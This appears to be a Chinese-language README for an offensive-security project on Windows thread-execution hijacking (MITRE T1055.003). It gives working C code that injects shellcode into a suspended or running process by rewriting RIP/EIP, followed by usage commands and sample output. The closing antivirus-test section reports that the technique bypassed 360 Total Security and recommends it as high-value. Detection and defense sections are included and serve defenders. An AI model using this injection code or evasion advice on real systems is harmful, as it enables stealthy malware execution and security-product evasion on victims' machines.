# Thread Hijacking (线程执行劫持)

## 技术概述

Thread Hijacking（线程执行劫持）是一种通过修改现有线程的执行上下文（寄存器状态）来劫持其执行流程的进程注入技术。与 CreateRemoteThread 等技术不同，Thread Hijacking 不创建新线程，而是直接劫持已存在线程的指令指针（RIP/EIP），使其执行我们的 shellcode。

**MITRE ATT&CK:** T1055.003 - Process Injection: Thread Execution Hijacking

## 核心原理

### 执行流程

```
1. 创建挂起的进程 (CREATE_SUSPENDED)
   └─> CreateProcessA(..., CREATE_SUSPENDED, ...)

2. 分配远程内存
   └─> VirtualAllocEx(hProcess, ..., PAGE_EXECUTE_READWRITE)

3. 写入 Shellcode
   └─> WriteProcessMemory(hProcess, remoteMemory, shellcode, ...)

4. 获取线程上下文
   └─> GetThreadContext(hThread, &ctx)
       ├─> ctx.ContextFlags = CONTEXT_FULL
       └─> 读取所有寄存器状态（包括 RIP/EIP）

5. 修改指令指针
   ├─> x64: ctx.Rip = (DWORD64)remoteMemory
   └─> x86: ctx.Eip = (DWORD)remoteMemory

6. 设置新的线程上下文
   └─> SetThreadContext(hThread, &ctx)

7. 恢复线程执行
   └─> ResumeThread(hThread)
       └─> 线程从 shellcode 地址开始执行
```

### CONTEXT 结构详解

**x64 CONTEXT 结构（简化）：**
```c
typedef struct _CONTEXT {
    DWORD64 ContextFlags;    // 标志：指定要获取/设置哪些部分

    // 段寄存器
    WORD   SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
    DWORD  EFlags;

    // 通用寄存器
    DWORD64 Rax, Rcx, Rdx, Rbx;
    DWORD64 Rsp, Rbp, Rsi, Rdi;
    DWORD64 R8, R9, R10, R11, R12, R13, R14, R15;

    // 指令指针 (关键!)
    DWORD64 Rip;             // 下一条要执行的指令地址

    // 浮点/SIMD 寄存器
    XMM_SAVE_AREA32 FltSave;

    // ...
} CONTEXT;
```

**x86 CONTEXT 结构（简化）：**
```c
typedef struct _CONTEXT {
    DWORD ContextFlags;

    // 调试寄存器
    DWORD Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;

    // 浮点状态
    FLOATING_SAVE_AREA FloatSave;

    // 段寄存器
    DWORD SegGs, SegFs, SegEs, SegDs;

    // 通用寄存器
    DWORD Edi, Esi, Ebx, Edx, Ecx, Eax;

    // 栈和基址指针
    DWORD Ebp, Esp;

    // 指令指针 (关键!)
    DWORD Eip;               // 下一条要执行的指令地址

    // 段和标志
    DWORD SegCs, EFlags, SegSs;
} CONTEXT;
```

### 关键机制：指令指针劫持

#### 正常执行流程
```
程序正常执行:
┌─────────────┐
│ Thread 启动 │
└─────┬───────┘
      │
      ▼
┌─────────────┐
│  RIP/EIP    │──> 指向程序入口点 (如 ntdll!RtlUserThreadStart)
│  = 0x7FF... │
└─────┬───────┘
      │
      ▼
  [执行程序代码]
```

#### 劫持后的执行流程
```
线程劫持执行:
┌─────────────┐
│ 1. 挂起线程 │
└─────┬───────┘
      │
      ▼
┌─────────────────┐
│ 2. 获取 CONTEXT │──> 原始 RIP = 0x7FF...
└─────┬───────────┘
      │
      ▼
┌─────────────────┐
│ 3. 修改 RIP     │──> 新 RIP = shellcode 地址
│    RIP = 0x123  │
└─────┬───────────┘
      │
      ▼
┌─────────────────┐
│ 4. 设置 CONTEXT │
└─────┬───────────┘
      │
      ▼
┌─────────────────┐
│ 5. 恢复线程     │
└─────┬───────────┘
      │
      ▼
  [执行 shellcode]  <── 线程从 shellcode 地址开始执行
```

## 与其他技术的对比

| 特征 | Thread Hijacking | CreateRemoteThread | APC Injection |
|------|------------------|-------------------|---------------|
| **创建新线程** | ❌ 否 | ✅ 是 | ❌ 否 |
| **需要目标可写内存** | ✅ 是 | ✅ 是 | ✅ 是 |
| **执行时机** | 立即（ResumeThread 后） | 立即 | 需要 Alertable 状态 |
| **修改线程上下文** | ✅ 是 | ❌ 否 | ❌ 否 |
| **目标进程状态** | 可以是挂起的新进程 | 必须是运行中进程 | 必须是运行中进程 |
| **隐蔽性** | 中 | 低（创建线程明显） | 高 |
| **检测难度** | 中 | 低 | 中-高 |

## 优势与劣势

### ✅ 优势

1. **不创建新线程**
   - 避免触发 CreateRemoteThread 相关的检测规则
   - 不增加目标进程的线程数

2. **精确控制执行时机**
   - 通过挂起/恢复线程精确控制 shellcode 执行时间
   - 可以在进程初始化的任意阶段注入

3. **灵活性高**
   - 可以劫持任意线程（只要能获取线程句柄）
   - 可以针对新创建的进程或运行中的进程

4. **绕过部分监控**
   - 不使用 CreateRemoteThread API
   - 执行流程更接近正常的线程调度

### ❌ 劣势

1. **需要线程句柄**
   - 必须有目标线程的 THREAD_SET_CONTEXT 权限
   - 对于受保护进程可能无法获取

2. **可能破坏线程状态**
   - 修改 RIP/EIP 后，原线程的执行流程被破坏
   - 如果 shellcode 不恢复上下文，线程可能崩溃

3. **容易被检测**
   - SetThreadContext 是一个敏感 API
   - 安全产品通常监控线程上下文修改

4. **平台相关**
   - x86 和 x64 的 CONTEXT 结构不同
   - 需要针对不同架构编写代码

## 实现步骤

### 步骤 1: 创建挂起的进程

```c
STARTUPINFOA si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

CreateProcessA(
    NULL,
    (LPSTR)targetPath,
    NULL,
    NULL,
    FALSE,
    CREATE_SUSPENDED | CREATE_NEW_CONSOLE,  // 创建挂起的进程
    NULL,
    NULL,
    &si,
    &pi
);
```

**关键点：**
- `CREATE_SUSPENDED`: 进程的主线程以挂起状态创建
- 返回的 `pi.hThread` 是主线程句柄
- 此时线程尚未执行任何代码

### 步骤 2-3: 分配内存并写入 Shellcode

```c
// 分配远程内存
LPVOID remoteMemory = VirtualAllocEx(
    pi.hProcess,
    NULL,
    shellcode_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

// 写入 shellcode
SIZE_T bytesWritten;
WriteProcessMemory(
    pi.hProcess,
    remoteMemory,
    shellcode,
    shellcode_size,
    &bytesWritten
);
```

### 步骤 4: 获取线程上下文

```c
#ifdef _WIN64
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;  // 获取所有寄存器

    GetThreadContext(pi.hThread, &ctx);

    printf("原始 RIP: 0x%llX\n", ctx.Rip);
#else
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pi.hThread, &ctx);

    printf("原始 EIP: 0x%lX\n", ctx.Eip);
#endif
```

**ContextFlags 选项：**
- `CONTEXT_CONTROL`: 控制寄存器（Rip/Eip, Rsp/Esp, SegCs, EFlags）
- `CONTEXT_INTEGER`: 整数寄存器（Rax-R15 / Eax-Edi）
- `CONTEXT_SEGMENTS`: 段寄存器
- `CONTEXT_FULL`: 上述所有
- `CONTEXT_ALL`: 包括调试寄存器

### 步骤 5: 修改指令指针

```c
#ifdef _WIN64
    // x64: 修改 RIP 寄存器
    ctx.Rip = (DWORD64)remoteMemory;
    printf("新 RIP: 0x%llX\n", ctx.Rip);
#else
    // x86: 修改 EIP 寄存器
    ctx.Eip = (DWORD)remoteMemory;
    printf("新 EIP: 0x%lX\n", ctx.Eip);
#endif
```

**原理：**
- CPU 的指令指针寄存器（RIP/EIP）存储下一条要执行的指令地址
- 修改它就能改变线程的执行流程
- 当线程恢复时，会从新的地址开始执行

### 步骤 6: 设置新的线程上下文

```c
SetThreadContext(pi.hThread, &ctx);
```

**注意：**
- 线程必须处于挂起状态才能设置上下文
- 设置成功后，新的寄存器值会在线程恢复时生效

### 步骤 7: 恢复线程执行

```c
ResumeThread(pi.hThread);
```

**执行流程：**
```
ResumeThread(hThread)
    │
    ▼
线程从挂起状态恢复
    │
    ▼
CPU 加载线程的上下文
    │
    ▼
RIP/EIP = shellcode 地址
    │
    ▼
开始执行 shellcode
```

## 编译和使用

### 编译

**Windows (CMD):**
```batch
build.bat
```

**Linux/MSYS (Bash):**
```bash
chmod +x build.sh
./build.sh
```

### 使用方法

```bash
# 基本用法
build\thread_hijacking.exe <目标程序路径> <shellcode文件>

# 示例：劫持 notepad.exe
build\thread_hijacking.exe "C:\Windows\System32\notepad.exe" build\calc_shellcode.bin

# 示例：生成自定义 shellcode
build\generate_shellcode.exe calc          # 生成 calc_shellcode.bin
build\generate_shellcode.exe messagebox    # 生成 messagebox_shellcode.bin
```

### 输出示例

```
========================================
  Thread Hijacking
  线程执行劫持
========================================

[+] 已读取 shellcode: 272 字节
[*] 目标程序: C:\Windows\System32\notepad.exe

[*] 步骤 1: 创建挂起的进程...
[+] 已创建挂起的进程
  [+] 进程 ID: 1234
  [+] 线程 ID: 5678
  [+] 进程句柄: 0x000001F4
  [+] 线程句柄: 0x000001F8

[*] 步骤 2: 分配远程内存...
[+] 已分配远程内存: 0x0000020000000000 (大小: 272 字节)

[*] 步骤 3: 写入 shellcode...
[+] 已写入 272 字节

[*] 步骤 4: 获取线程上下文...
[+] 已获取线程上下文 (x64)
  [*] 原始 RIP: 0x7FFE12340000

[*] 步骤 5: 修改指令指针...
  [+] 新 RIP: 0x0000020000000000

[*] 步骤 6: 设置新的线程上下文...
[+] 已设置新的线程上下文

[*] 步骤 7: 恢复线程执行...
[+] 线程已恢复，shellcode 正在执行...

[+] 线程劫持成功！
[*] Shellcode 已在目标进程中执行
```

## 检测与防御

### 🔍 检测方法

#### 1. API 监控
监控以下敏感 API 调用序列：
```c
CreateProcess(..., CREATE_SUSPENDED, ...)
    ↓
VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)
    ↓
WriteProcessMemory(...)
    ↓
GetThreadContext(...)
    ↓
SetThreadContext(...)  // 🚨 高度可疑
    ↓
ResumeThread(...)
```

**特征：**
- 短时间内连续调用这些 API
- `SetThreadContext` 调用尤其可疑（正常程序很少使用）
- RIP/EIP 指向非模块地址

#### 2. 行为分析

**异常行为：**
```c
// 正常线程的 RIP 应该指向合法模块
正常 RIP: 0x7FFE12340000  (ntdll.dll 范围内)
异常 RIP: 0x0000020000000  (动态分配的内存，非模块地址)
```

**检测点：**
- RIP/EIP 指向非模块内存（VirtualAllocEx 分配的区域）
- RIP/EIP 指向具有 RWX 权限的内存
- 线程上下文修改后立即恢复执行

#### 3. 内存扫描

```c
// 扫描特征
for each thread in process:
    context = GetThreadContext(thread)
    memory_info = VirtualQueryEx(process, context.Rip)

    if (memory_info.Protection == PAGE_EXECUTE_READWRITE &&
        memory_info.Type == MEM_PRIVATE):
        ALERT("可能的线程劫持")
```

#### 4. ETW (Event Tracing for Windows)

监控事件：
- `Microsoft-Windows-Kernel-Process`: 进程/线程创建事件
- `Microsoft-Windows-Kernel-Memory`: 内存分配事件
- `Microsoft-Windows-Threat-Intelligence`: 线程上下文修改事件

### 🛡️ 防御措施

#### 1. 进程保护

```c
// 启用进程缓解措施
PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = {0};
policy.ProhibitDynamicCode = 1;

SetProcessMitigationPolicy(
    ProcessDynamicCodePolicy,
    &policy,
    sizeof(policy)
);
```

**效果：**
- 禁止动态代码生成
- 阻止 VirtualAllocEx 分配可执行内存

#### 2. 最小权限原则

```c
// 创建进程时移除 PROCESS_VM_WRITE 权限
HANDLE hProcess = OpenProcess(
    PROCESS_QUERY_INFORMATION,  // 只读权限
    FALSE,
    pid
);
```

#### 3. 监控敏感 API

使用 Detours/MinHook 拦截：
```c
BOOL WINAPI HookedSetThreadContext(
    HANDLE hThread,
    CONST CONTEXT* lpContext
) {
    // 检查 RIP/EIP 是否指向合法模块
    if (!IsLegitimateAddress(lpContext->Rip)) {
        LogAlert("检测到可疑的线程上下文修改");
        return FALSE;  // 阻止操作
    }

    return TrueSetThreadContext(hThread, lpContext);
}
```

#### 4. EDR/XDR 解决方案

- **Sysmon**: 配置规则监控 SetThreadContext
- **Elastic**: 部署检测规则
- **Carbon Black**: 启用线程注入检测

**Sysmon 配置示例：**
```xml
<RuleGroup name="ThreadHijacking">
  <SetThreadContext onmatch="include">
    <TargetImage condition="is">C:\Windows\System32\notepad.exe</TargetImage>
  </SetThreadContext>
</RuleGroup>
```

## 进阶技巧

### 1. 上下文恢复

为避免目标线程崩溃，shellcode 执行完毕后应恢复原始上下文：

```c
// Shellcode 框架
push rax                    // 保存所有寄存器
push rbx
// ... 保存其他寄存器

mov rax, [原始_RIP]        // 执行 payload
call rax

pop rbx                     // 恢复所有寄存器
pop rax
// ... 恢复其他寄存器

jmp [原始_RIP]             // 跳转回原始执行点
```

### 2. 劫持运行中进程的线程

```c
// 1. 枚举目标进程的线程
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te32 = {0};
te32.dwSize = sizeof(te32);

Thread32First(hSnapshot, &te32);
do {
    if (te32.th32OwnerProcessID == targetPid) {
        // 2. 挂起线程
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
        SuspendThread(hThread);

        // 3. 获取上下文
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(hThread, &ctx);

        // 4. 修改 RIP/EIP
        ctx.Rip = (DWORD64)shellcode_address;

        // 5. 设置上下文并恢复
        SetThreadContext(hThread, &ctx);
        ResumeThread(hThread);
    }
} while (Thread32Next(hSnapshot, &te32));
```

### 3. 组合其他技术

**Thread Hijacking + Process Hollowing:**
```c
1. 创建挂起的合法进程
2. 使用 Process Hollowing 替换镜像
3. 使用 Thread Hijacking 劫持主线程
4. 让主线程执行 Hollowed 代码
```

## 参考资料

### 技术文档
- [MITRE ATT&CK - T1055.003](https://attack.mitre.org/techniques/T1055/003/)
- [ired.team - Thread Hijacking](https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking)
- [Microsoft Docs - CONTEXT Structure](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)
- [Microsoft Docs - SetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)

### 开源项目
- [ThreadHijacking_CSharp](https://github.com/Kara-4search/ThreadHijacking_CSharp) - C# 实现
- [Injection Techniques](https://github.com/elastic/detection-rules) - Elastic 检测规则

### 相关技术
- [Early Bird APC](../06-earlybird-apc) - 启动时 APC 注入
- [APC Queue Injection](../18-apc-queue-injection) - 运行时 APC 队列注入
- [Process Hollowing](../10-process-hollowing) - 进程镂空

## 许可证

本项目仅供教育和研究目的使用。请勿用于非法活动。

## 杀软测试

### 360安全卫士 13.0.10.2001（核晶模式）

**测试时间:** 2025-11

**测试结果:** ✅ **未检出** - 完美执行

**观察:**
- 线程劫持技术成功绕过360监控
- SetThreadContext修改RIP未触发警报

**建议:**
- 高价值技术，建议使用
- 注意选择已初始化的线程

